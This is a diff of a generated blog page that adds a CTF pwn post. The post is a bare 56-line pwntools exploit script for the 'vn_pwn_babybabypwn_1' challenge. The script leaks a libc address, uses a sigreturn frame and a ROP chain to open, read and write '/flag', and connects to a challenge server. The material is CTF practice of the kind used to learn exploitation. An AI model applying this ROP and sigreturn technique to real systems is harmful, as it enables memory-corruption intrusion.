@@ -6,14 +6,18 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta property="og:type" content="article">
+    <meta name="description" content="exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!&#x2F;usr&#x2F;bin&#x2F;python#coding:utf-8from pwn import *context.update(arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;,timeou">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo test">
 <meta property="og:url" content="http://startpwn.top/2020/04/29/Hexo-test/index.html">
-<meta property="og:site_name" content="ssta&#39;s blog">
+<meta property="og:site_name" content="Sp4rta&#39;s blog">
+<meta property="og:description" content="exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!&#x2F;usr&#x2F;bin&#x2F;python#coding:utf-8from pwn import *context.update(arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;,timeou">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-04-29T00:54:46.000Z">
-<meta property="article:modified_time" content="2020-04-29T00:54:46.041Z">
+<meta property="article:modified_time" content="2020-04-29T01:54:16.501Z">
 <meta property="article:author" content="ssta">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
     
     
@@ -122,7 +126,7 @@
 
     <div class="meta">
       <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">ssta's blog</span>
+        <span itemprop="name">Sp4rta's blog</span>
       </span>
       
     <div class="postdate">
@@ -136,13 +140,21 @@
       
 
       
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
 
     </div>
   </header>
   
 
   <div class="content" itemprop="articleBody">
-    
+    <p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,timeout=<span class="number">1</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.Q:</span><br><span class="line">	io=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29793</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io=process(<span class="string">'./vn_pwn_babybabypwn_1'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">sla=<span class="keyword">lambda</span> a,b:io.sendlineafter(a,b)</span><br><span class="line">sa=<span class="keyword">lambda</span> a,b:io.sendafter(a,b)</span><br><span class="line">sl=<span class="keyword">lambda</span> a:io.sendline(a)</span><br><span class="line">ru=<span class="keyword">lambda</span> a:io.recvuntil(a)</span><br><span class="line">rv=<span class="keyword">lambda</span> a:io.recv(a)</span><br><span class="line">ia=<span class="keyword">lambda</span> :io.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">	ru(<span class="string">'gift: '</span>)</span><br><span class="line">	puts_leak=int(rv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">	log.success(<span class="string">'puts_leak==&gt;&#123;&#125;'</span>.format(hex(puts_leak)))</span><br><span class="line">	<span class="keyword">return</span> puts_leak</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(leak)</span>:</span></span><br><span class="line">	libc_base=leak-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">	open_addr=libc_base+libc.sym[<span class="string">'open'</span>]</span><br><span class="line">	pop_rdi=libc_base+<span class="number">0x0000000000021102</span></span><br><span class="line">	pop_rsi=libc_base+<span class="number">0x00000000000202e8</span></span><br><span class="line">	pop_rdx=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">	read_addr=libc_base+libc.sym[<span class="string">'read'</span>]</span><br><span class="line">	open_addr=libc_base+libc.sym[<span class="string">'open'</span>]</span><br><span class="line">	write_addr=libc_base+libc.sym[<span class="string">'write'</span>]</span><br><span class="line">	malloc_hook=libc_base+libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">	log.success(<span class="string">'read_addr==&gt;&#123;&#125;'</span>.format(hex(read_addr)))</span><br><span class="line"></span><br><span class="line">	frame = SigreturnFrame()</span><br><span class="line">	frame.rdi = <span class="number">0</span></span><br><span class="line">	frame.rsi = malloc_hook</span><br><span class="line">	frame.rdx = <span class="number">0x200</span></span><br><span class="line">	frame.rsp = malloc_hook</span><br><span class="line">	frame.rip = read_addr</span><br><span class="line">	payload =str(frame)[<span class="number">0x8</span>:]</span><br><span class="line">	sla(<span class="string">'message: '</span>,payload)</span><br><span class="line">	<span class="comment">##gdb.attach(io,'b read')</span></span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line">	payload =p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(malloc_hook<span class="number">-8</span>)+p64(pop_rdx)+p64(<span class="number">8</span>)+p64(read_addr)</span><br><span class="line">	payload+=p64(pop_rdi)+p64(malloc_hook<span class="number">-8</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">	payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(malloc_hook<span class="number">-0x40</span>)+p64(pop_rdx)+p64(<span class="number">0x40</span>)+p64(read_addr)</span><br><span class="line">	payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(write_addr)</span><br><span class="line">	sl(payload)</span><br><span class="line">	sl(<span class="string">'/flag\x00'</span>)</span><br><span class="line">	<span class="keyword">print</span> rv(<span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">	leak=leak()</span><br><span class="line">	pwn(leak)</span><br></pre></td></tr></table></figure>
+
+
   </div>
 </article>
 
